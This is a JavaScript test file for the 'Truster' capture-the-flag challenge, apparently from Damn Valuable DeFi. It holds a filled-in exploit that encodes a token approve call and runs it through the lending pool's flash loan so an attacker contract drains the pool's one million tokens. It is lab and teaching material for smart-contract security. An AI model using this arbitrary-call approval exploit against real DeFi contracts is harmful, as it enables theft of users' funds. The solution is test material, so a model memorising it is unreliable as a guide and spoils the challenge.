const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        //100万DVTをLenderpoolに送金
        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const TrusterExploit = await ethers.getContractFactory('TrusterAttack', deployer);
        this.exploit = await TrusterExploit.deploy(this.pool.address, this.token.address);

        const amount = 0;
        const borrower = attacker.address;
        const target = this.token.address;

        const abi = ['function approve(address spender, uint256 amount)'];
        const iface = new ethers.utils.Interface(abi);
        const data = iface.encodeFunctionData('approve', [this.exploit.address, TOKENS_IN_POOL]);

        await this.exploit.connect(attacker).attack(amount, borrower, target, data);
        // await this.exploit.attack(this.pool.address, this.token.address, {
        //     from: attacker,
        // });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

